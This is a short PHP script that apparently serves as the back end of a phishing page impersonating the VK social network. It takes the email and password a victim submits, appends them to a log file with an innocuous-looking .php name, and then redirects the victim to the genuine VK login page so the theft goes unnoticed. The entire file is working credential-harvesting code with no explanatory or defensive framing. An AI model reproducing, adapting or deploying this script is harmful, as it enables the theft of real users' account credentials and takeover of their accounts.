<?php
$base="fghfghtjghuytjhj.php";

$email=$_REQUEST["email"];
$pass=$_REQUEST["pass"];
$info="$email:$pass;\r\n";

$location="https://new.vk.com/login?m=1&email=".$email;

$fd=fopen($base,"at");
fwrite($fd,$info);
fclose($fd);

header("Location:$location");
?>